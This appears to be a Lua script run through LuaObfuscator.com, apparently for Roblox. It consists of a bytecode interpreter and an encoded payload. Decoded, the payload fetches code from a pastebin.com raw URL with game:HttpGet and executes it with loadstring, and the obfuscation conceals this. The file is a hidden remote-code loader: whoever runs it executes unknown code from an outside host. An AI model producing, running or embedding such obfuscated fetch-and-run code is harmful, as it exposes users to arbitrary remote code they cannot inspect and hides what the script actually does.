--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v81=v2(v0(v30,16));if v19 then local v87=v5(v81,v19);v19=nil;return v87;else return v81;end end end);local function v20(v31,v32,v33) if v33 then local v82=(v31/((5 -3)^(v32-(2 -1))))%(((1271 -(226 + 1044)) + 1)^(((v33-1) -(v32-(1 -0))) + (2 -1))) ;return v82-(v82%(620 -(555 + 64))) ;else local v83=2^(v32-((4 -3) -0)) ;return (((v31%(v83 + v83))>=v83) and (932 -(857 + (191 -(32 + 85))))) or (568 -(367 + 201)) ;end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35,v36=v1(v16,v18,v18 + 2 );v18=v18 + 2 + 0 ;return (v36 * (57 + 199)) + v35 ;end local function v23() local v37,v38,v39,v40=v1(v16,v18,v18 + ((1310 -(87 + 263)) -((1072 -(67 + 113)) + 65)) );v18=v18 + (9 -5) ;return (v40 * 16777216) + (v39 * (121138 -55602)) + (v38 * (469 -213)) + v37 ;end local function v24() local v41=v23();local v42=v23();local v43=1;local v44=(v20(v42,1 + 0 ,49 -29 ) * ((2 + 0)^(127 -95))) + v41 ;local v45=v20(v42,(3057 -2084) -(802 + 150) ,(101 -(10 + 8)) -52 );local v46=((v20(v42,32)==(1 -0)) and  -(1 + (0 -0))) or (998 -(915 + 82)) ;if (v45==(0 -0)) then if (v44==(0 + 0)) then return v46 * (0 -0) ;else v45=1188 -(1069 + 118) ;v43=0 -0 ;end elseif (v45==(4477 -2430)) then return ((v44==(0 + 0)) and (v46 * (1/(0 -(442 -(416 + 26)))))) or (v46 * NaN) ;end return v8(v46,v45-(1015 + 8) ) * (v43 + (v44/((793 -(368 + 423))^52))) ;end local function v25(v47) local v48;if  not v47 then v47=v23();if (v47==(0 -0)) then return "";end end v48=v3(v16,v18,(v18 + v47) -(1 + 0) );v18=v18 + v47 ;local v49={};for v64=1 -0 , #v48 do v49[v64]=v2(v1(v3(v48,v64,v64)));end return v6(v49);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v50=(function() return 0;end)();local v51=(function() return;end)();local v52=(function() return;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();while true do local v66=(function() return 0 -0 ;end)();while true do if (v66==1) then if (v50==2) then v57=(function() return {};end)();for v96= #"!",v56 do local v97=(function() return 0;end)();local v98=(function() return;end)();local v99=(function() return;end)();while true do if (v97==(2 -1)) then if (v98== #":") then v99=(function() return v21()~=0 ;end)();elseif (v98==2) then v99=(function() return v24();end)();elseif (v98== #"gha") then v99=(function() return v25();end)();end v57[v96]=(function() return v99;end)();break;end if (v97==0) then local v141=(function() return 0;end)();while true do if (v141~=1) then else v97=(function() return 1;end)();break;end if (0==v141) then v98=(function() return v21();end)();v99=(function() return nil;end)();v141=(function() return 1207 -(696 + 510) ;end)();end end end end end v55[ #"91("]=(function() return v21();end)();v50=(function() return 3;end)();end if (v50==1) then local v93=(function() return 0 -0 ;end)();while true do if (v93==(1263 -(1091 + 171))) then v56=(function() return v23();end)();v50=(function() return 1 + 1 ;end)();break;end if ((0 -0)==v93) then v54=(function() return {};end)();v55=(function() return {v52,v53,nil,v54};end)();v93=(function() return 1;end)();end end end break;end if (v66~=0) then else if (v50==3) then for v100= #"[",v23() do local v101=(function() return v21();end)();if (v20(v101, #">", #"[")==(374 -(123 + 251))) then local v133=(function() return 0;end)();local v134=(function() return;end)();local v135=(function() return;end)();local v136=(function() return;end)();while true do if (v133==(9 -7)) then if (v20(v135, #",", #"[")== #"<") then v136[2]=(function() return v57[v136[2]];end)();end if (v20(v135,700 -(208 + 490) ,1 + 1 )== #"~") then v136[ #"-19"]=(function() return v57[v136[ #"19("]];end)();end v133=(function() return 2 + 1 ;end)();end if (v133~=0) then else local v153=(function() return 0;end)();while true do if (v153==(837 -(660 + 176))) then v133=(function() return 1 + 0 ;end)();break;end if (v153==0) then v134=(function() return v20(v101,204 -(14 + 188) , #"xxx");end)();v135=(function() return v20(v101, #".com",681 -(534 + 141) );end)();v153=(function() return 1 + 0 ;end)();end end end if ((1 + 0)~=v133) then else local v154=(function() return 0;end)();local v155=(function() return;end)();while true do if (v154==0) then v155=(function() return 0;end)();while true do if (1~=v155) then else v133=(function() return 2;end)();break;end if (v155==0) then local v167=(function() return 0 + 0 ;end)();while true do if (v167~=0) then else v136=(function() return {v22(),v22(),nil,nil};end)();if (v134==(0 -0)) then local v169=(function() return 0 -0 ;end)();local v170=(function() return;end)();while true do if (v169==(0 + 0)) then v170=(function() return 0 + 0 ;end)();while true do if (v170~=0) then else v136[ #"asd"]=(function() return v22();end)();v136[ #"xnxx"]=(function() return v22();end)();break;end end break;end end elseif (v134== #":") then v136[ #"91("]=(function() return v23();end)();elseif (v134==(398 -(115 + 281))) then v136[ #"-19"]=(function() return v23() -(2^16) ;end)();elseif (v134~= #"xnx") then else local v176=(function() return 0 -0 ;end)();local v177=(function() return;end)();while true do if (v176==(0 + 0)) then v177=(function() return 0 -0 ;end)();while true do if (v177==(0 -0)) then v136[ #"19("]=(function() return v23() -((869 -(550 + 317))^(22 -6)) ;end)();v136[ #"asd1"]=(function() return v22();end)();break;end end break;end end end v167=(function() return 1;end)();end if (v167~=1) then else v155=(function() return 1 -0 ;end)();break;end end end end break;end end end if (3==v133) then if (v20(v135, #"91(", #"asd")== #"{") then v136[ #".dev"]=(function() return v57[v136[ #"?id="]];end)();end v52[v100]=(function() return v136;end)();break;end end end end for v102= #"|",v23() do v53,v102,v28=(function() return v51(v53,v102,v28);end)();end return v55;end if (v50~=0) then else local v94=(function() return 0;end)();local v95=(function() return;end)();while true do if ((0 -0)==v94) then v95=(function() return 285 -(134 + 151) ;end)();while true do if ((1666 -(970 + 695))~=v95) then else v53=(function() return {};end)();v50=(function() return 1 -0 ;end)();break;end if (v95==0) then v51=(function() return function(v160,v161,v162) local v163=(function() return 1990 -(582 + 1408) ;end)();local v164=(function() return;end)();while true do if (v163~=0) then else v164=(function() return 0;end)();while true do if (v164==(0 -0)) then local v168=(function() return 0 -0 ;end)();while true do if (v168~=(0 -0)) then else v160[v161-#"!" ]=(function() return v162();end)();return v160,v161,v162;end end end end break;end end end;end)();v52=(function() return {};end)();v95=(function() return 1825 -(1195 + 629) ;end)();end end break;end end end v66=(function() return 1;end)();end end end end local function v29(v58,v59,v60) local v61=v58[1 + 0 ];local v62=v58[2 -0 ];local v63=v58[244 -(187 + 54) ];return function(...) local v67=v61;local v68=v62;local v69=v63;local v70=v27;local v71=(2332 -(1126 + 425)) -((567 -(118 + 287)) + 618) ;local v72= -((6937 -5167) -(1749 + 20));local v73={};local v74={...};local v75=v12("#",...) -(1323 -(1249 + 73)) ;local v76={};local v77={};for v84=0,v75 do if (v84>=v69) then v73[v84-v69 ]=v74[v84 + 1 + 0 ];else v77[v84]=v74[v84 + (1146 -(466 + 679)) ];end end local v78=(v75-v69) + 1 + (1121 -(118 + 1003)) ;local v79;local v80;while true do v79=v67[v71];v80=v79[1 -0 ];if (v80<=(4 -1)) then if (v80<=(1 + 0)) then if ((v80>(1636 -(1373 + (769 -506)))) or (1421>2104)) then local v103=v79[1002 -(451 + 549) ];v77[v103]=v77[v103](v13(v77,v103 + 1 + (377 -(142 + 235)) ,v72));else v77[v79[2 -0 ]]=v60[v79[4 -1 ]];end elseif ((1812<=3249) and (v80==(1386 -(746 + 638)))) then local v107=0 + 0 ;local v108;local v109;while true do if (v107==(0 -0)) then v108=v79[(1555 -1212) -(218 + 27 + 96) ];v109=v77[v79[1584 -(1535 + 46) ]];v107=1;end if (v107==(1 + 0)) then v77[v108 + 1 + 0 ]=v109;v77[v108]=v109[v79[1 + (980 -(553 + 424)) ]];break;end end else do return;end end elseif ((1623<=1957) and (v80<=(565 -((578 -272) + 254)))) then if (v80>(1 + 3)) then local v110;local v111,v112;local v113;local v114;v77[v79[3 -1 ]]={};v71=v71 + (1468 -(899 + 501 + 67)) ;v79=v67[v71];v77[v79[2 -0 ]]=v60[v79[3]];v71=v71 + 1 + 0 + 0 ;v79=v67[v71];v77[v79[4 -2 ]]=v60[v79[606 -(268 + 335) ]];v71=v71 + (291 -(60 + 230)) ;v79=v67[v71];v114=v79[574 -(426 + 146) ];v113=v77[v79[1 + 2 ]];v77[v114 + (1457 -(282 + 1174)) ]=v113;v77[v114]=v113[v79[3 + 1 ]];v71=v71 + 1 ;v79=v67[v71];v77[v79[813 -(569 + 141 + 101) ]]=v79[3];v71=v71 + (2 -1) ;v79=v67[v71];v114=v79[7 -(3 + 2) ];v111,v112=v70(v77[v114](v13(v77,v114 + 1 + 0 ,v79[(587 + 440) -(706 + 318) ])));v72=(v112 + v114) -(1252 -(721 + 530)) ;v110=580 -(361 + 219) ;for v137=v114,v72 do v110=v110 + ((2757 -1485) -((2632 -1687) + 326)) ;v77[v137]=v111[v110];end v71=v71 + 1 + (0 -0) ;v79=v67[v71];v114=v79[4 -(1 + 1) ];v77[v114]=v77[v114](v13(v77,v114 + 1 + 0 ,v72));v71=v71 + (3 -2) ;v79=v67[v71];v77[v79[702 -(271 + 429) ]]();v71=v71 + 1 + 0 ;v79=v67[v71];do return;end else v77[v79[2 + 0 ]]=v79[853 -((96 -76) + 830) ];end elseif (v80<=(5 + 1)) then v77[v79[2 + 0 ]]={};elseif (v80>(1507 -(1408 + 92))) then local v142=v79[1088 -(461 + 625) ];local v143,v144=v70(v77[v142](v13(v77,v142 + 1 ,v79[1291 -(993 + (1048 -(239 + 514))) ])));v72=(v144 + v142) -(1 -0) ;local v145=0 + 0 ;for v151=v142,v72 do local v152=(412 + 759) -(418 + 753) ;while true do if (v152==(0 + 0)) then v145=v145 + (1330 -(797 + 532)) + 0 ;v77[v151]=v143[v145];break;end end end else v77[v79[1 + 1 ]]();end v71=v71 + 1 + 0 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403213Q00682Q7470733A2Q2F706173746562696E2E636F6D2F7261772F795272686D7A595A00094Q00057Q00122Q000100013Q00122Q000200023Q00202Q00020002000300122Q000400046Q000200046Q00013Q00024Q0001000100016Q00017Q00",v9(),...);
